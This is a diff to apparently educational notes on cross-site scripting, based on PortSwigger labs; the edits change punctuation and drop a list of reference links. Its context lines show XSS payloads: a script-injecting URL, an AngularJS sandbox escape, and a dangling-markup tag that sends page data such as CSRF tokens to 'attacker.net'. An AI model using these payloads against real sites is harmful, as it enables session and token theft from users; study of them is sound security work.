@@ -34,7 +34,7 @@ Attack:
 https://insecure-website.com/status?message=<script>/* bad stuff */</script>
 ```
 Victim must be tricked into clicking a crafted link (delivered via phishing, the lab's
-"exploit server", etc.). Not persistent — only affects the user who makes the request.
+"exploit server", etc.). Not persistent, only affects the user who makes the request.
 
 ### Stored XSS (persistent / second-order)
 Malicious data is **saved server-side** (comments, nicknames, order details, chat, etc.) and
@@ -87,7 +87,7 @@ then choose the minimal payload that survives.
 ## 4. Client-side template injection (AngularJS sandbox)
 
 Old AngularJS (<1.6) evaluates `{{ }}` expressions and sandboxes them. Classic sandbox-escape
-payload (works pre-1.6, no strings needed — useful when quotes are blocked):
+payload (works pre-1.6, no strings needed, useful when quotes are blocked):
 
 ```
 {{constructor.constructor('alert(1)')()}}
@@ -111,7 +111,7 @@ sensitive data like a CSRF token) as part of that attribute's value, then send i
 <img src="https://attacker.net/log?
 ```
 Everything up to the next `"` in the real page gets appended to the URL and requested from
-the attacker's server. No JavaScript execution needed — this is why it can bypass CSP.
+the attacker's server. No JavaScript execution needed, this is why it can bypass CSP.
 
 ## 7. Content Security Policy (CSP)
 
@@ -140,15 +140,3 @@ scripts the browser will execute, as defense-in-depth against XSS.
 (20 Jul 2021), **cross-origin iframes can no longer call `alert()`**. For attacks built inside
 a cross-origin iframe, use `print()` instead — PortSwigger labs accept either where relevant.
 
-## 10. Sub-pages this notes file summarizes
-
-- Reflected XSS — https://portswigger.net/web-security/cross-site-scripting/reflected
-- Stored XSS — https://portswigger.net/web-security/cross-site-scripting/stored
-- DOM-based XSS — https://portswigger.net/web-security/cross-site-scripting/dom-based
-- XSS contexts — https://portswigger.net/web-security/cross-site-scripting/contexts
-- Client-side template injection — https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection
-- Exploiting XSS — https://portswigger.net/web-security/cross-site-scripting/exploiting
-- Dangling markup injection — https://portswigger.net/web-security/cross-site-scripting/dangling-markup
-- Content Security Policy — https://portswigger.net/web-security/cross-site-scripting/content-security-policy
-- Preventing XSS — https://portswigger.net/web-security/cross-site-scripting/preventing
-- Cheat sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
